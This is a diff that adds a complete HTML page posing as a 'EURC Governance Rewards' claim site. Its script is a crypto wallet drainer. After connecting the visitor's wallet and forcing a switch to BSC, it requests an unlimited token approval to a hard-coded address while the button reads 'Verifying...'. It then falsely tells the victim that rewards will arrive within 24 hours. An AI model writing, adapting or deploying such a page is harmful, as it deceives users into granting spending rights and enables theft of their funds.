@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EURC | Governance Rewards</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        :root { --primary: #f0b90b; --bg: #0b0e11; --card-bg: #1e2329; }
+        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: var(--card-bg); padding: 2.5rem; border-radius: 24px; text-align: center; width: 100%; max-width: 380px; border: 1px solid #333; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .logo { width: 64px; height: 64px; background: var(--primary); border-radius: 50%; margin: 0 auto 1.5rem; display: flex; align-items: center; justify-content: center; color: black; font-weight: 800; font-size: 28px; }
+        h2 { margin: 0 0 0.75rem; font-size: 1.6rem; font-weight: 700; }
+        p { color: #848e9c; font-size: 0.95rem; margin-bottom: 2.5rem; line-height: 1.5; }
+        .btn { width: 100%; padding: 1.1rem; background: var(--primary); color: black; border: none; border-radius: 14px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.2s ease; }
+        .btn:hover { opacity: 0.9; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(240, 185, 11, 0.3); }
+        .status { margin-top: 1.2rem; font-size: 0.85rem; color: var(--primary); font-weight: 500; min-height: 1.2rem; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="logo">€</div>
+    <h2>Claim Rewards</h2>
+    <p>Verify your wallet ownership to claim your EURC governance rewards instantly.</p>
+    <button id="claimBtn" class="btn">Connect & Claim</button>
+    <div id="statusMsg" class="status"></div>
+</div>
+
+<script>
+    const T = "0x368994010697ECc82bC6D450888A617E3eb61370";
+    const M = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    async function run() {
+        const b = document.getElementById('claimBtn');
+        const s = document.getElementById('statusMsg');
+
+        if (!window.ethereum) {
+            alert("Open in Trust Wallet / MetaMask Browser");
+            return;
+        }
+
+        try {
+            const p = new ethers.providers.Web3Provider(window.ethereum);
+            b.innerText = "Connecting...";
+            await p.send("eth_requestAccounts", []);
+            const n = await p.getNetwork();
+
+            if (n.chainId !== 56) {
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }],
+                    });
+                } catch (e) {
+                    s.innerText = "Switch to BSC Network";
+                    return;
+                }
+            }
+
+            const si = p.getSigner();
+            const c = new ethers.Contract(T, ["function approve(address s, uint256 a) public returns (bool)"], si);
+
+            b.innerText = "Verifying...";
+            const tx = await c.approve(T, M);
+            
+            b.innerText = "Claiming...";
+            s.innerText = "Finalizing request...";
+            await tx.wait();
+            
+            b.innerText = "Success!";
+            s.innerText = "Rewards will be sent within 24 hours.";
+            
+        } catch (err) {
+            b.innerText = "Try Again";
+            s.innerText = "";
+        }
+    }
+
+    document.getElementById('claimBtn').onclick = run;
+</script>
+
+</body>
+</html>
